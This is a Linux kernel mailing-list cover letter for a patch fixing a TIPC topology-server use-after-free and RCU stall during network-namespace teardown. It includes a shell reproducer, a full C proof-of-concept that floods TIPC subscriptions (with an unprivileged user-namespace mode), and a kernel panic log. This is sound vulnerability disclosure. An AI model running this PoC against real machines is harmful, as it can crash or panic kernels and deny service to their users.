Received: from mail-pj2-f41.google.com (mail-pj2-f41.google.com [74.125.227.169])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 926D546E011
	for <stable@vger.kernel.org>; Mon, 28 Sep 2026 08:24:57 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.169
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790583899; cv=none; b=AvQqiR4pHSj1U6DZ8BMOcUO6SXd/0wHjohH6t3tWdgsCGwkM/yLS9O7XkZl5IM9Vk9QELtTG+ru4j97AbdfnhzfPB0qYIU+DkfVFAYYqcPAPe019Wk/bEcxHE48H0M36jNWdV0e4vwDHfmYpSARp1ZwWAIYSjf1OVuSRb+h3mjw=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790583899; c=relaxed/simple;
	bh=Gcm+CSwV+Jw9KzWb9ePIgxhx5KqpNPowR4bTneMgugE=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=DSVi/JHKomYdG7BSUnrHvF8h61vwMvuZfVR8Bj6T/FCWAo5aGrPuttA0o+S9BQpQpqRciwuGxuj/m/OoSAN6COqPoZSYu7mvYlCAFl9yvDWikwOL4RPs9rouCyItyJuSxjeTPnmJlwXU1cZG4cqlVJeTH/Foyc356PIvLT7txNg=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=VOHxLEdC; arc=none smtp.client-ip=74.125.227.169
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="VOHxLEdC"
Received: by mail-pj2-f41.google.com with SMTP id 98e67ed59e1d1-3a0bd71827eso1483252a91.0
        for <stable@vger.kernel.org>; Mon, 28 Sep 2026 01:24:57 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1790583897; x=1791188697; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=CdFDwwZxyhnxAbN7zzF1lQu0yPjid5h0AcfNO/Os8Mg=;
        b=VOHxLEdCyGwsVpxxumT5pYrO1/xI64W1rbVYDRl1IFnBTPSnsJcWp6mvhLSY+DfK8r
         Hb6x59XOWpIqFjy3KGG93iV/rzLeNmBkyF/kuPYDJGL25SFhPoZqn1cwY3k9bYrEyYPA
         ipRUk184HeZ0VjK3mMbDE2ezfDzgX+j9HDENMOIGfaO2ttiyq7ZWcdVJGx57Jpjm6kuK
         tIqkii0etEURKUGaGZVVNu6/GpTI9Q6J4QJZIk6yWFgWH20lFzDfflNiF+TNZ1aS+0eA
         0ObTITQp79K3LA4LxqraGOxFd+K+Vh1XXFokGnJd30lSkr8I3kRkk/SSEbJH3Nc5Qs15
         dwAg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790583897; x=1791188697;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=CdFDwwZxyhnxAbN7zzF1lQu0yPjid5h0AcfNO/Os8Mg=;
        b=Bfsr3Zs0lOqZ+5uKtOKz/VIjjaZhuG3zJsT00MTyMikfdMp5nIzSziB+b7CqWrLOMI
         q5pEmazNP4MhLhDK/ABBa0pppHlb1dMVCy3awzrY/g3FR0wfN3lolbKewRgfVeTsP5Vf
         poIesDgrFW2VnkJyjgiTNhAOS5LMjm03ESdUh3nqaSoy7FZTe6pwIWGL92RsOemgC25p
         fMyR5QGT9BDhWGAARdpVbN0ZbQRH8GSEK+hlI5bO2tuM76F8yFjzcMoE8ltIpHRcBFqB
         jXZVdfVQ++kyWM2UmZa4VOYLvdYorgo5jFQCtzqx+VfzCPRBFARVMUl7deg9NOFlr7cs
         otag==
X-Forwarded-Encrypted: i=1; AKwUvByXwVt85TANctmKZ4h7EHTInUbmATiEXCfyTPqhMP1mF/WSByztJUeKwYhUFG7eAZFYxvIrUVs=@vger.kernel.org
X-Gm-Message-State: AFq9FYIPvIOCUavpi+izzygmWYnHo0EvCX0ZCJTPdH3P6+Nik+BpL3Zg
	zVWuWwMepBs7PjRl2GVUPMYYJ7jwVC/2DKA2ZWjnpJ4LoxYOOiHT7ghh
X-Gm-Gg: AYBFou22ovESMDk82/o8BniKJMHslvKrrmMS7YD730h/k8i1zYeSUPo98QuIHEGFD8e
	GSUJCOaH7QDckd6ftc4bXiFio4FPgU1y9XqDpNpIMhG02c/b+LoMRkBVhIx0+kIFhh8iAc9bPqV
	AVBQaxOdcmFMMPqKzD/Sm6eVdhKwKy0DCzYOO5FOOhFXiI9zPlbfdHOnM8qjaBRag5VcGJlDaJW
	2t7d8H62CTXBxrQ2x3lLn55kZR0HYAmr3oUyOhxQvRpcr8rX7iIl4tAbqCkagUeud9H44b4ZxGJ
	+Gq2nKPCXih53nQPUj0KMj/+tfW905m/x8i6O/LOAvVbk6vKEClhKmDy8Ib/Pq6Vo8OJH3pxhKk
	nX2J6qR4Z2/6Dmt20BJzuKgn8hul28BxyWf5nFP7wUiNouWgXcmPHCZpjOqHy0EBBGPdWqG+Gm2
	6fCyLMx9i2svHIsQZKW7FuMhIRMXq6AeJTREHy/fg3Ys1qHusHbD2X+maDRkPQBa+IbwAhp4E5A
	UiWsCs/KiKI4AlkwLs2fGhVHABMCezrfg4rO8UO1Jfc/xNnc3Cuh6xs8Ne4IZq3o/WTr0vn+K1u
	l8E1u/Nh
X-Received: by 2002:a17:90b:17c7:b0:3a0:ab20:9e88 with SMTP id 98e67ed59e1d1-3a0ab20a125mr7936817a91.44.1790583896727;
        Mon, 28 Sep 2026 01:24:56 -0700 (PDT)
Received: from lenovo-thinkbook.lenovo.com (42-2-127-248.static.netvigator.com. [42.2.127.248])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a0b8d31b4esm7104456a91.3.2026.09.28.01.24.44
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 28 Sep 2026 01:24:56 -0700 (PDT)
From: Yuqi Xu <xuyuqiabc@gmail.com>
To: netdev@vger.kernel.org,
	Tung Quang Nguyen <tung.quang.nguyen@est.tech>
Cc: Jon Maloy <jmaloy@redhat.com>,
	"David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	Ying Xue <ying.xue@windriver.com>,
	Paul Gortmaker <paul.gortmaker@windriver.com>,
	tipc-discussion@lists.sourceforge.net,
	stable@vger.kernel.org,
	Vega <vega@nebusec.ai>,
	Ren Wei <weir@nebusec.ai>,
	xuyq21@lenovo.com
Subject: [PATCH net v3 0/1] tipc: fix connection lifetime during netns teardown
Date: Mon, 28 Sep 2026 16:24:37 +0800
Message-ID: <cover.1790157006.git.xuyuqiabc@gmail.com>
X-Mailer: git-send-email 2.55.0
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/tipc/topsrv.c. The PoC
supports --userns (CLONE_NEWUSER|CLONE_NEWNET) for an unprivileged
user, but the captured traces are root mode.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

Changes in v3:
 - This version supersedes the narrower diff Tung Quang Nguyen
   posted in-thread on 2026-09-23 (replying to v2 1/2, Message-ID
   DU4P189MB3750BEF36FF7EEBA03E152FFC6822@DU4P189MB3750.EURP189.PROD.OUTLOOK.COM).
   v3 keeps his teardown order and adds the lookup refusal and the
   empty-idr unlock.
 - Teardown order kept from that diff: set listener = NULL under
   idr_lock, refuse new queue_work, destroy the send/receive
   workqueues, then close remaining connections.
 - Added on top of that diff: refuse tipc_conn_lookup() after
   listener is NULL, and drop idr_lock when the conn_idr walk finds
   no connection, so an in-flight subscription event cannot pin the
   walk.
 - Drop v2 2/2. Once in-flight work is flushed first, the conn_idr
   walk rewrite is not needed.
 - Point Fixes: at c5fa7b3cf3cb, which first closed connections while
   the workqueues were still live.
 - Tested with ./poc -i 6000 -t 4 -r 5000 and ./poc -i 6000 -t 4
   -r 20000 (6000 iterations each, no warning/Oops/RCU stall).
 - v2 Link: https://lore.kernel.org/all/cover.1789960909.git.xuyuqiabc@gmail.com/

Changes in v2:
 - Add the exact reproduction command and the stack traces we observe
   to this changelog, as requested by Tung Quang Nguyen.
 - v1 Link: https://lore.kernel.org/all/cover.1789722780.git.xuyuqiabc@gmail.com/

Reproduction command (root mode, matching the captured trace):

  # 2 vCPU, 2 GB RAM x86_64 QEMU
  # Linux 7.3.0-rc3-00344-g1e24c4f2ee44 #1 PREEMPT(lazy)
  sysctl -w kernel.panic_on_rcu_stall=1
  echo 20 > /sys/module/rcupdate/parameters/rcu_cpu_stall_timeout
  MODE=root ./poc.sh 6000 4 20000
  # i.e. ./poc -i 6000 -t 4 -r 20000

The captured trace is root mode (UID 0). Its kernel banner is
Linux 7.3.0-rc3-00344-g1e24c4f2ee44, which is not the series
base-commit. The PoC supports --userns, but that mode is not what
this trace shows. This run hit an RCU stall at about 20 s
(t=20002 jiffies). The crash-log section below is a contiguous
excerpt of that same trace.

With only v2 1/2 applied, Tung Nguyen also observed:

[  271.777368] refcount_t: addition on 0; use-after-free.
[  271.794423] Workqueue: netns cleanup_net
[  271.810559]  tipc_topsrv_exit_net+0x1b4/0x1e0 [tipc]
...
[  271.846984] BUG: unable to handle page fault for address: 00000001000002cf
[  271.872088]  tipc_conn_close+0x24/0xa0 [tipc]
[  271.872938]  tipc_topsrv_exit_net+0x108/0x1e0 [tipc]

That is the same root cause: send/receive work still running during
the connection walk. v3 destroys those workqueues first.

---- details below ----

Bug details:

`tipc_topsrv_stop()` closed subscriber connections while the topology
server's send and receive workqueues were still running. Socket
callbacks and subscription events could then queue more work, and
in-flight send/recv work could drop the last connection reference
during the conn_idr walk. That is a use-after-free / refcount race
on netns teardown, also visible as an RCU stall in
`tipc_topsrv_exit_net()` and as `queue_work()` on a destroyed
workqueue from the listener data-ready callback.

Reproducer:

#!/bin/sh
set -eu

SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"

ITERATIONS="${1:-6000}"
THREADS="${2:-4}"
RUNTIME_USEC="${3:-20000}"
MODE="${MODE:-root}"              # root | userns
STALL_TIMEOUT="${STALL_TIMEOUT:-20}"
CC_BIN="${CC:-gcc}"

cd "$SCRIPT_DIR"

"$CC_BIN" -O2 -Wall -pthread -o poc poc.c

if [ "${SET_PANIC_ON_RCU_STALL:-1}" = "1" ] && [ "$(id -u)" -eq 0 ]; then
	sysctl -w kernel.panic_on_rcu_stall=1 >/dev/null 2>&1 || true
	if [ -w /sys/module/rcupdate/parameters/rcu_cpu_stall_timeout ]; then
		echo "$STALL_TIMEOUT" > /sys/module/rcupdate/parameters/rcu_cpu_stall_timeout
	fi
fi

if [ "$MODE" = "userns" ]; then
	CMD="./poc --userns -i $ITERATIONS -t $THREADS -r $RUNTIME_USEC"
else
	CMD="./poc -i $ITERATIONS -t $THREADS -r $RUNTIME_USEC"
fi

echo "[*] running: $CMD"
exec sh -c "$CMD"


We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------


#define _GNU_SOURCE

#include <errno.h>
#include <getopt.h>
#include <linux/tipc.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

static atomic_int stop_flag;

struct run_cfg {
	int iterations;
	int threads;
	int runtime_usec;
	int ns_flags;
};

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s [-i iterations] [-t threads] [-r runtime_usec] [--userns]\n"
		"  -i, --iterations   number of fork/teardown cycles (default: 6000)\n"
		"  -t, --threads      flood worker threads per cycle (default: 4)\n"
		"  -r, --runtime-us   worker runtime per cycle in usec (default: 20000)\n"
		"  -U, --userns       use CLONE_NEWUSER|CLONE_NEWNET (for non-root)\n",
		prog);
}

static void parse_args(int argc, char **argv, struct run_cfg *cfg)
{
	static const struct option long_opts[] = {
		{ "iterations", required_argument, NULL, 'i' },
		{ "threads", required_argument, NULL, 't' },
		{ "runtime-us", required_argument, NULL, 'r' },
		{ "userns", no_argument, NULL, 'U' },
		{ "help", no_argument, NULL, 'h' },
		{ 0, 0, 0, 0 },
	};
	int c;

	cfg->iterations = 6000;
	cfg->threads = 4;
	cfg->runtime_usec = 20000;
	cfg->ns_flags = CLONE_NEWNET;

	while ((c = getopt_long(argc, argv, "i:t:r:Uh", long_opts, NULL)) != -1) {
		switch (c) {
		case 'i':
			cfg->iterations = atoi(optarg);
			break;
		case 't':
			cfg->threads = atoi(optarg);
			break;
		case 'r':
			cfg->runtime_usec = atoi(optarg);
			break;
		case 'U':
			cfg->ns_flags = CLONE_NEWUSER | CLONE_NEWNET;
			break;
		case 'h':
		default:
			usage(argv[0]);
			exit(c == 'h' ? 0 : 1);
		}
	}

	if (cfg->iterations <= 0 || cfg->threads <= 0 || cfg->runtime_usec < 0) {
		usage(argv[0]);
		exit(1);
	}
}

static void *flood_worker(void *arg)
{
	uintptr_t tid = (uintptr_t)arg;
	struct sockaddr_tipc sa;
	struct tipc_subscr sub;

	memset(&sa, 0, sizeof(sa));
	sa.family = AF_TIPC;
	sa.addrtype = TIPC_SERVICE_ADDR;
	sa.scope = TIPC_NODE_SCOPE;
	sa.addr.name.name.type = TIPC_TOP_SRV;
	sa.addr.name.name.instance = TIPC_TOP_SRV;

	memset(&sub, 0, sizeof(sub));
	sub.seq.type = 0x20000 + (uint32_t)tid;
	sub.seq.lower = 1;
	sub.seq.upper = 1;
	sub.timeout = 0xffffffffu;
	sub.filter = TIPC_SUB_SERVICE;

	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
		int fd = socket(AF_TIPC, SOCK_SEQPACKET | SOCK_NONBLOCK, 0);

		if (fd < 0)
			continue;

		(void)connect(fd, (struct sockaddr *)&sa, sizeof(sa));
		(void)send(fd, &sub, sizeof(sub), MSG_DONTWAIT);
		close(fd);
	}

	return NULL;
}

static void run_one_iteration(const struct run_cfg *cfg)
{
	pthread_t *tids;
	int i;

	if (unshare(cfg->ns_flags) < 0)
		_exit(111);

	tids = calloc((size_t)cfg->threads, sizeof(*tids));
	if (!tids)
		_exit(1);

	atomic_store_explicit(&stop_flag, 0, memory_order_relaxed);
	for (i = 0; i < cfg->threads; i++)
		pthread_create(&tids[i], NULL, flood_worker,
			       (void *)(uintptr_t)(i + 1));

	usleep((useconds_t)cfg->runtime_usec);

	_exit(0);
}

int main(int argc, char **argv)
{
	struct run_cfg cfg;
	int i;
	int ns_failures = 0;

	parse_args(argc, argv, &cfg);

	for (i = 0; i < cfg.iterations; i++) {
		pid_t pid = fork();
		int st;

		if (pid == 0)
			run_one_iteration(&cfg);
		if (pid < 0)
			return 1;

		if (waitpid(pid, &st, 0) < 0)
			return 1;

		if (WIFEXITED(st) && WEXITSTATUS(st) == 111)
			ns_failures++;

		if ((i % 200) == 0)
			fprintf(stderr, "iter=%d ns_failures=%d\n", i, ns_failures);
	}

	if (ns_failures == cfg.iterations) {
		fprintf(stderr,
			"all iterations failed to create namespaces (EPERM likely)\n");
		return 2;
	}

	return 0;
}


------END poc.c--------

----BEGIN crash log----

Excerpt of the captured root-mode RCU stall on Linux
7.3.0-rc3-00344-g1e24c4f2ee44. The guest init line in this
excerpt is "init: starting PoC: -i 6000 -t 4 -r 20000".
Contiguous lines copied from that trace:

init: starting PoC: -i 6000 -t 4 -r 20000
[    0.814214] poc (65) used greatest stack depth: 14112 bytes left
[    0.814220] poc (66) used greatest stack depth: 14032 bytes left
[    0.814306] poc (69) used greatest stack depth: 13856 bytes left
iter=0 ns_failures=0
[   20.832329] rcu: INFO: rcu_preempt detected stalls on CPUs/tasks:
[   20.833203] rcu: 	(detected by 0, t=20002 jiffies, g=-1003, q=11014 ncpus=2)
[   20.834173] rcu: All QSes seen, last rcu_preempt kthread activity 20002 (4294687948-4294667946), jiffies_till_next_fqs=3, root ->qsmask 0x0
[   20.835838] rcu: rcu_preempt kthread starved for 20002 jiffies! g-1003 f0x2 RCU_GP_WAIT_FQS(5) ->state=R ->cpu=1
[   20.837215] rcu: 	Unless rcu_preempt kthread gets sufficient CPU time, OOM is now expected behavior.
[   20.838449] rcu: RCU grace-period kthread stack dump:
[   20.839142] task:rcu_preempt     state:R  running task     stack:14744 pid:16    tgid:16    ppid:2      task_flags:0x208040 flags:0x00080000
[   20.840822] Call Trace:
[   20.841179]  <TASK>
[   20.841492]  __schedule+0x440/0xf80
[   20.842026]  ? __pfx_rcu_gp_kthread+0x10/0x10
[   20.842648]  schedule+0x23/0xa0
[   20.843107]  schedule_timeout+0x9e/0x120
[   20.843662]  ? __pfx_process_timeout+0x10/0x10
[   20.844303]  rcu_gp_fqs_loop+0xf7/0x5f0
[   20.844835]  ? __pfx_rcu_gp_kthread+0x10/0x10
[   20.845458]  rcu_gp_kthread+0xfa/0x1d0
[   20.845980]  kthread+0xe1/0x120
[   20.846431]  ? __pfx_kthread+0x10/0x10
[   20.846949]  ret_from_fork+0x177/0x240
[   20.847518]  ? __pfx_kthread+0x10/0x10
[   20.848063]  ret_from_fork_asm+0x1a/0x30
[   20.848617]  </TASK>
[   20.848935] rcu: Stack dump where RCU GP kthread last ran:
[   20.849696] Sending NMI from CPU 0 to CPUs 1:
[   20.850327] NMI backtrace for cpu 1
[   20.850330] CPU: 1 UID: 0 PID: 12 Comm: kworker/u8:0 Not tainted 7.3.0-rc3-00344-g1e24c4f2ee44 #1 PREEMPT(lazy) 
[   20.850333] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-10.fc44 06/10/2025
[   20.850335] Workqueue: netns cleanup_net
[   20.850340] RIP: 0010:__radix_tree_lookup+0x1b/0xa0
[   20.850345] Code: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 0f 1f 40 d6 53 49 89 f9 49 89 d2 48 89 f7 49 89 cb 49 8b 51 08 48 89 d0 83 e0 03 <48> 83 f8 02 75 70 48 89 d0 48 83 e0 fd 0f b6 08 b8 40 00 00 00 48
[   20.850346] RSP: 0018:ffffa8134006bd70 EFLAGS: 00000202
[   20.850348] RAX: 0000000000000002 RBX: 0000000000000000 RCX: 0000000000000000
[   20.850349] RDX: ffff91c08169e6da RSI: ffffffffb094c358 RDI: ffffffffb094c358
[   20.850350] RBP: ffff91c081a43f80 R08: ffff91c08169e8f8 R09: ffff91c081a43f80
[   20.850350] R10: 0000000000000000 R11: 0000000000000000 R12: 00000000b094c358
[   20.850351] R13: ffff91c081a43f98 R14: ffffffffb5a40950 R15: ffff91c0815bf100
[   20.850356] FS:  0000000000000000(0000) GS:ffff91c14746d000(0000) knlGS:0000000000000000
[   20.850357] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   20.850358] CR2: 00007f1266956ff8 CR3: 0000000062630000 CR4: 0000000000750ef0
[   20.850359] PKRU: 55555554
[   20.850360] Call Trace:
[   20.850361]  <TASK>
[   20.850362]  tipc_topsrv_exit_net+0x8b/0x1a0
[   20.850367]  ? srso_alias_return_thunk+0x5/0xfbef5
[   20.850369]  ops_undo_list+0xef/0x250
[   20.850372]  cleanup_net+0x1d2/0x330
[   20.850375]  process_one_work+0x197/0x390
[   20.850379]  worker_thread+0x169/0x2d0
[   20.850382]  ? __pfx_worker_thread+0x10/0x10
[   20.850384]  kthread+0xe1/0x120
[   20.850386]  ? __pfx_kthread+0x10/0x10
[   20.850388]  ret_from_fork+0x177/0x240
[   20.850391]  ? __pfx_kthread+0x10/0x10
[   20.850393]  ret_from_fork_asm+0x1a/0x30
[   20.850398]  </TASK>
[   20.876630] Kernel panic - not syncing: RCU Stall
[   20.877303] CPU: 0 UID: 0 PID: 32 Comm: kworker/u8:1 Not tainted 7.3.0-rc3-00344-g1e24c4f2ee44 #1 PREEMPT(lazy) 
[   20.878915] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-10.fc44 06/10/2025
[   20.880467] Workqueue: tipc_rcv tipc_topsrv_accept
[   20.881150] Call Trace:
[   20.881515]  <IRQ>
[   20.881817]  dump_stack_lvl+0x4d/0x70
[   20.882370]  vpanic+0x201/0x3f0
[   20.882826]  panic+0x66/0x70
[   20.883268]  ? irq_work_queue+0x2e/0x60
[   20.883817]  panic_on_rcu_stall.isra.0+0x2b/0x30
[   20.884505]  rcu_sched_clock_irq.cold+0x1bb/0x422
[   20.885197]  ? __pfx_tick_nohz_handler+0x10/0x10
[   20.885847]  update_process_times+0x81/0xd0
[   20.886470]  tick_nohz_handler+0x8c/0x160
[   20.887061]  __hrtimer_run_queues+0xf3/0x220
[   20.887665]  ? srso_alias_return_thunk+0x5/0xfbef5
[   20.888355]  hrtimer_interrupt+0x102/0x1f0
[   20.888925]  ? __pfx_hrtimer_interrupt+0x10/0x10
[   20.889592]  __sysvec_apic_timer_interrupt+0x53/0x110
[   20.890307]  ? srso_alias_return_thunk+0x5/0xfbef5
[   20.890968]  sysvec_apic_timer_interrupt+0x66/0x80
[   20.891641]  </IRQ>
[   20.891950]  <TASK>
[   20.892270]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
[   20.892986] RIP: 0010:queued_spin_lock_slowpath+0x130/0x2b0
[   20.893753] Code: c0 0f 85 e4 00 00 00 be 01 00 00 00 f0 0f b1 31 0f 85 d5 00 00 00 66 90 65 ff 0d 37 8e 41 01 48 83 c4 20 e9 ed f5 c5 fe f3 90 <e9> d9 fe ff ff 65 8b 05 0c 25 40 01 48 0f a3 05 24 32 c4 00 73 d8
[   20.896267] RSP: 0018:ffffa81340117df8 EFLAGS: 00000202
[   20.897002] RAX: 0000000000000001 RBX: ffff91c082001cc0 RCX: ffff91c081a43f98
[   20.897983] RDX: 0000000000000001 RSI: 0000000000000001 RDI: ffff91c081a43f98
[   20.898959] RBP: ffff91c081a43f80 R08: 00000000000000c0 R09: ffff91c082001cc0
[   20.899946] R10: ffff91c082001cc0 R11: 0000000000000000 R12: ffff91c081a43f80
[   20.900924] R13: ffff91c082a8f440 R14: 0000000000000000 R15: ffff91c081a43fa8
[   20.901905]  ? srso_alias_return_thunk+0x5/0xfbef5
[   20.902581]  tipc_conn_alloc+0xaf/0x150
[   20.903126]  tipc_topsrv_accept+0x7d/0x170
[   20.903699]  ? srso_alias_return_thunk+0x5/0xfbef5
[   20.904372]  ? __pfx_tipc_topsrv_accept+0x10/0x10
[   20.905029]  process_one_work+0x197/0x390
[   20.905595]  worker_thread+0x169/0x2d0
[   20.906129]  ? __pfx_worker_thread+0x10/0x10
[   20.906729]  kthread+0xe1/0x120
[   20.907178]  ? __pfx_kthread+0x10/0x10
[   20.907706]  ret_from_fork+0x177/0x240
[   20.908233]  ? __pfx_kthread+0x10/0x10
[   20.908765]  ret_from_fork_asm+0x1a/0x30
[   20.909326]  </TASK>
[   20.909756] Kernel Offset: 0x32a00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[   20.911233] Rebooting in 1 seconds..

-----END crash log-----

Best regards,
Yuqi Xu

Yuqi Xu (1):
  tipc: destroy topsrv workqueues before closing connections

 net/tipc/topsrv.c | 80 ++++++++++++++++++++++++++++++++++++++---------
 1 file changed, 65 insertions(+), 15 deletions(-)


base-commit: 9c572a83037a7dcd653ba3a9cc468c16b857d0c9
-- 
2.55.0
